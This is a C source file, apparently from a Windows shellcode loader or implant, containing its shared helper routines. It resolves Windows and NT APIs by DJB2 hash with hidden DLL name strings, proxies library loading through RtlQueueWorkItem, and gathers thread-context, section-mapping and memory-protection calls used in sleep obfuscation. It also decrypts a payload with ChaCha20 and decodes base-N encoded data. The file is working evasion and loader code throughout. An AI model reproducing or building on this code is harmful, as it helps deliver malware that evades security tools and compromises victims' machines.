// Common.c
#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "ChaCha.h"
#include "Debug.h"

#define BASE_N 5

/*=========================================
@ InitializeWin32Apis Function
===========================================*/
BOOL InitializeWin32Apis(OUT PWIN32_API pWin32Apis) {

	PVOID					Kernel32			= { 0 };
	PVOID					Ntdll				= { 0 };
	PVOID					Advapi				= { 0 };
	PVOID					CryptBase			= { 0 };
	WCHAR					AdvString[]			= { L'a', L'd', L'v', L'a', L'p', L'i', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
	WCHAR					CryptBaseString[]	= { L'c', L'r', L'y', L'p', L't', L'b', L'a', L's', L'e', L'.', L'd', L'l', L'l', L'\0' };
	
#ifdef DEBUG
	DBGPRINT("[*] Initializing Win32 Apis \n");
#endif

//------------------------------------------------------------

	// Load Kernel32 & NTDLL
	if (!(Kernel32 = LdrGetModule(KERNEL32_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] LdrGetModule -> Failed To Get Kernel32 Handle - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

	if (!(Ntdll = LdrGetModule(NTDLL_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] LdrGetModule -> Failed To Get Ntdll Handle - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------
	
	/*
		Since LoadLibraryW, GetModuleHandleW, and RtlQueueWorkItem are required by the WorkItemProxyLoadLibraryW function,
		they must be initialized prior to loading Advapi32 and cryptbase.
	*/

	if (!(pWin32Apis->K32.LoadLibraryW = LdrRetrieveFunction(Kernel32, LoadLibraryW_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize LoadLibraryW - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

	if (!(pWin32Apis->K32.GetModuleHandleW = LdrRetrieveFunction(Kernel32, GetModuleHandleW_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize GetModuleHandleW - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

	if (!(pWin32Apis->Nt.RtlQueueWorkItem = LdrRetrieveFunction(Ntdll, RtlQueueWorkItem_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize RtlQueueWorkItem - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------
	
	// Load Advapi32 & CryptBase
	if (!(Advapi = WorkItemProxyLoadLibraryW(AdvString))) {
#ifdef DEBUG
		DBGPRINT("[-] WorkItemProxyLoadLibraryW -> Failed To Load Advapi32 - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

	if (!(CryptBase = WorkItemProxyLoadLibraryW(CryptBaseString))) {
#ifdef DEBUG
		DBGPRINT("[-] WorkItemProxyLoadLibraryW -> Failed To Load CryptBase - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------
	
	// Initialize the remaining apis
	if (!(pWin32Apis->K32.WaitForSingleObject = LdrRetrieveFunction(Kernel32, WaitForSingleObject_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize WaitForSingleObject - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

	if (!(pWin32Apis->K32.WaitForSingleObjectEx = LdrRetrieveFunction(Kernel32, WaitForSingleObjectEx_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize WaitForSingleObjectEx - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

	if (!(pWin32Apis->K32.VirtualProtect = LdrRetrieveFunction(Kernel32, VirtualProtect_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize VirtualProtect - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

	if (!(pWin32Apis->K32.SetEvent = LdrRetrieveFunction(Kernel32, SetEvent_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize SetEvent - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------
	
	if (!(pWin32Apis->Nt.NtContinue = LdrRetrieveFunction(Ntdll, NtContinue_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize NtContinue - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------
	
	if (!(pWin32Apis->Nt.NtCreateEvent = LdrRetrieveFunction(Ntdll, NtCreateEvent_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize NtCreateEvent - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------
	
	if (!(pWin32Apis->Nt.NtCreateSection = LdrRetrieveFunction(Ntdll, NtCreateSection_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize NtCreateSection - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

	if (!(pWin32Apis->Nt.NtDuplicateObject = LdrRetrieveFunction(Ntdll, NtDuplicateObject_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize NtDuplicateObject - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------
	
	if (!(pWin32Apis->Nt.NtGetContextThread = LdrRetrieveFunction(Ntdll, NtGetContextThread_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize NtGetContextThread - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

	if (!(pWin32Apis->Nt.NtSetContextThread = LdrRetrieveFunction(Ntdll, NtSetContextThread_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize NtSetContextThread - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------
	
	if (!(pWin32Apis->Nt.NtMapViewOfSection = LdrRetrieveFunction(Ntdll, NtMapViewOfSection_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize NtMapViewOfSection - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

	if (!(pWin32Apis->Nt.NtOpenThread = LdrRetrieveFunction(Ntdll, NtOpenThread_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize NtOpenThread - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------
	
	if (!(pWin32Apis->Nt.NtQuerySystemInformation = LdrRetrieveFunction(Ntdll, NtQuerySystemInformation_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize NtQuerySystemInformation - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

	if (!(pWin32Apis->Nt.NtQueryInformationProcess = LdrRetrieveFunction(Ntdll, NtQueryInformationProcess_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize NtQueryInformationProcess - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------
	
	if (!(pWin32Apis->Nt.NtResumeThread = LdrRetrieveFunction(Ntdll, NtResumeThread_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize NtResumeThread - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------
	
	if (!(pWin32Apis->Nt.NtSignalAndWaitForSingleObject = LdrRetrieveFunction(Ntdll, NtSignalAndWaitForSingleObject_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize NtSignalAndWaitForSingleObject - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------
	
	if (!(pWin32Apis->Nt.NtSuspendThread = LdrRetrieveFunction(Ntdll, NtSuspendThread_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize NtSuspendThread - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------
	
	if (!(pWin32Apis->Nt.NtWaitForSingleObject = LdrRetrieveFunction(Ntdll, NtWaitForSingleObject_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize NtWaitForSingleObject - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

	if (!(pWin32Apis->Nt.RtlRegisterWait = LdrRetrieveFunction(Ntdll, RtlRegisterWait_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize RtlRegisterWait - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

	if (!(pWin32Apis->Nt.RtlWalkHeap = LdrRetrieveFunction(Ntdll, RtlWalkHeap_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize RtlWalkHeap - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

	if (!(pWin32Apis->Nt.RtlCaptureContext = LdrRetrieveFunction(Ntdll, RtlCaptureContext_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize RtlCaptureContext - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

	if (!(pWin32Apis->AdvApi.SystemFunction032 = LdrRetrieveFunction(Advapi, SystemFunction032_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize SystemFunction032 - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

	if (!(pWin32Apis->AdvApi.RegOpenKeyExW = LdrRetrieveFunction(Advapi, RegOpenKeyExW_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize RegOpenKeyExW - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

	if (!(pWin32Apis->AdvApi.RegQueryValueExW = LdrRetrieveFunction(Advapi, RegQueryValueExW_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize RegQueryValueExW - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

	if (!(pWin32Apis->AdvApi.RegCloseKey = LdrRetrieveFunction(Advapi, RegCloseKey_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize RegCloseKey - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

	if (!(pWin32Apis->CryptBase.SystemFunction040 = LdrRetrieveFunction(CryptBase, SystemFunction040_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize SystemFunction040 - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

	if (!(pWin32Apis->CryptBase.SystemFunction041 = LdrRetrieveFunction(CryptBase, SystemFunction041_DJB2))) {
#ifdef DEBUG
		DBGPRINT("[-] InitializeWin32Apis -> Failed To Initialize SystemFunction041 - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//------------------------------------------------------------

#ifdef DEBUG
	DBGPRINT("[+] Success \n");
#endif
	return TRUE;
}

/*=========================================
@ HashStringDJB2 Function
===========================================*/
ULONG HashStringDJB2(IN PVOID String, IN ULONG Length) {

	ULONG						Hash		= INITIAL_HASH;
	PUCHAR						Ptr			= String;
	UCHAR						C			= { 0 };

	do {

		C = *Ptr;

		// If ANSI
		if (!Length) {
			if (!*Ptr)
				break;
		}

		// If UNICODE
		else {
			if (U_PTR(Ptr - U_PTR(String)) >= Length)
				break;

			if (!*Ptr) {
				++Ptr;
				continue;
			}
		}

		// Convert current character to uppercase
		if (C >= 'a' && C <= 'z')
			C -= 0x20;

		// Append hash
		Hash = ( ( Hash << INITIAL_SEED ) + Hash ) + C;
		++Ptr;

	} while (TRUE);
	
	return Hash;
}

/*=========================================
@ Decryption & Decoding Functions
===========================================*/
BOOL ChaCha20Decrypt(PBYTE pPayload, SIZE_T sPayloadSize, PBYTE pKey, PBYTE pIv) {

	if (!pPayload || !pKey || !pIv || sPayloadSize == 0) {
		return FALSE;
	}

	return chacha_memory(
		pKey, 32,
		20,
		pIv, 12,
		1,
		pPayload,
		(unsigned long)sPayloadSize,
		pPayload
	) == CRYPT_OK;
}

VOID BaseNDecode(IN PBYTE InputBuffer, IN SIZE_T InputBufferSize, OUT PBYTE* ppOutputBuffer, OUT PSIZE_T psOutputSize) {

	if (!InputBuffer || !InputBufferSize || !ppOutputBuffer) return;

	SIZE_T TmpSize = *psOutputSize = (BASE_N * InputBufferSize - (BASE_N * 8 - 4)) / 8;
	*ppOutputBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, TmpSize);
	if (!*ppOutputBuffer) return;

	unsigned char* TmpOutputBuffer = (unsigned char*)*ppOutputBuffer;
	unsigned char* TmpInputBuffer = (unsigned char*)InputBuffer;
	unsigned int X = 0, Z = 0;

	// Writing 8 bits, Reading BASE_N bits
	BYTE WL = 8, RL = BASE_N, MV = (1 << 8) - 1;

	while (TmpSize) {
		X = (X << RL) | (*TmpInputBuffer++ & ((1 << BASE_N) - 1));
		Z += RL;
		while (Z >= WL) {
			Z -= WL;
			*TmpOutputBuffer++ = (X >> Z) & MV;
			TmpSize--;
			if (TmpSize == 0) break;
		}
	}
}

/*=========================================
@ AnsiToUnicode Helper Function
===========================================*/
VOID AnsiToUnicode(IN PCSTR AnsiString, OUT PWSTR UnicodeString, IN SIZE_T MaxCount) {

	if (!AnsiString || !UnicodeString || !MaxCount)
		return;

	SIZE_T i = 0;

	while (AnsiString[i] != '\0' && i < (MaxCount - 1)) {

		UnicodeString[i] = (WCHAR)AnsiString[i];

		i++;
	}

	UnicodeString[i] = L'\0';
}

/*=========================================
@ CRT Function Replacements
===========================================*/

/* Memcpy */
VOID MEMCPY(IN PVOID Destination, IN PVOID Source, IN SIZE_T Size) {

	PBYTE D = (PBYTE)Destination;
	PBYTE S = (PBYTE)Source;

	while (Size--)
		*D++ = *S++;
}

/* Strlen */
SIZE_T STRLEN(IN PCSTR String) {

	const char* Ptr = String;

	if (!String) return 0x00;

	while (*Ptr) {
		Ptr++;
	}

	return (SIZE_T)(Ptr - String);
}

/* Memset */
PVOID MEMSET(IN PVOID Destination, IN INT Value, IN SIZE_T Count) {

	PBYTE D = (PBYTE)Destination;

	while (Count > 0) {

		*D = (BYTE)Value;
		D++;
		Count--;
	}

	return Destination;
}

/* strstr */
const char* STRSTR(const char* haystack, const char* needle) {
	if (!*needle) return haystack;

	for (; *haystack; haystack++) {
		char h_char = (*haystack >= 'A' && *haystack <= 'Z') ? (*haystack + 32) : *haystack;
		char n_char = (*needle >= 'A' && *needle <= 'Z') ? (*needle + 32) : *needle;

		if (h_char == n_char) {
			const char* h = haystack;
			const char* n = needle;

			while (*h && *n) {
				char cur_h = (*h >= 'A' && *h <= 'Z') ? (*h + 32) : *h;
				char cur_n = (*n >= 'A' && *n <= 'Z') ? (*n + 32) : *n;

				if (cur_h != cur_n) break;
				h++;
				n++;
			}
			if (!*n) return haystack;
		}
	}
	return NULL;
}

/* Intrinsics */
extern void* _cdecl memset(void*, int, size_t);
#pragma intrinsic(memset)
#pragma function(memset)
void* _cdecl memset(void* pTarget, int value, size_t cbTarget) {

	unsigned char* p = (unsigned char*)pTarget;

	while (cbTarget-- > 0) {

		*p++ = (unsigned char)value;
	}

	return pTarget;
}

extern void* _cdecl strrchr(const char*, int);
#pragma intrinsic(strrchr)
#pragma function(strrchr)
char* _cdecl strrchr(const char* str, int c) {
	
	char* LastOccur = NULL;

	while (*str) {

		if (*str == c) {

			LastOccur = (char*)str;
		
		}

		str++;
	}

	return LastOccur;
}

extern void* _cdecl memcpy(void*, void*, size_t);
#pragma intrinsic(memcpy)
#pragma function(memcpy)
void* __cdecl memcpy(void* destination, const void* source, size_t size) {
	unsigned char* d = (unsigned char*)destination;
	const unsigned char* s = (const unsigned char*)source;

	while (size--) {
		*d++ = *s++;
	}

	return destination;
}
